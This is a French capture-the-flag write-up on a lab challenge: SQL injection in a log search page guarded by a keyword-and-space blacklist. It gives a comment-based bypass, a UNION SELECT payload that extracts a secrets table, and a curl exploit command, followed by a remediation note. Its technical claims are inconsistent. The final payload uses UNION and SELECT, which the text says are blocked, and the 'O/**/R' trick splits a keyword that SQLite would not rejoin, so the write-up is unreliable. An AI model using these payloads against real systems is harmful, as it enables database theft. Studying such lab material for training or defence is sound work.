# Write-up — Défi 2 : Le Quine SQL

**Catégorie** : Programmation / SQL / Évasion  
**Niveau** : Intermédiaire  
**Flag** : `CTF{w1th0ut_sp4c3s_sql}`  
**Commande de départ** : `curl http://<IP>:5001` ou navigateur

---

## Contexte

Le serveur expose un moteur de recherche dans une base de logs. Il applique un filtre "liste noire" qui bloque :
```
SELECT, UNION, WHERE, OR, AND, et les espaces ( )
```

La requête SQL construite côté serveur :
```sql
SELECT id, message, level FROM logs WHERE message LIKE '%<INPUT>%'
```

L'entrée utilisateur est concaténée directement → **injection SQL**.

---

## Étapes de résolution

### 1. Confirmer la vulnérabilité

Tester avec une apostrophe `'` → erreur SQL confirmée.

### 2. Remplacer les espaces

SQLite ignore les commentaires multilignes `/**/` entre les tokens :
```sql
-- Interdit :
OR 1=1
-- Bypass :
O/**/R/**/1=1
```

### 3. Construire un UNION SELECT

Pour extraire la table `secrets` :
```
a%'/**/UNION/**/SELECT/**/name,value,'x'/**/FROM/**/secrets--
```

Ce qui produit :
```sql
SELECT id, message, level FROM logs WHERE message LIKE '%a%'
UNION SELECT name, value, 'x' FROM secrets--'%'
```

### 4. Récupérer le flag

```bash
curl "http://<IP>:5001/search?q=a%25'/**/UNION/**/SELECT/**/name,value,'x'/**/FROM/**/secrets--"
```

Le tableau affiche une ligne supplémentaire avec `CTF{w1th0ut_sp4c3s_sql}`.

---

## Vulnérabilité expliquée

Concaténation directe de l'entrée dans la requête SQL. Un filtre liste noire est insuffisant.

**Remédiation** : Utiliser des requêtes préparées.
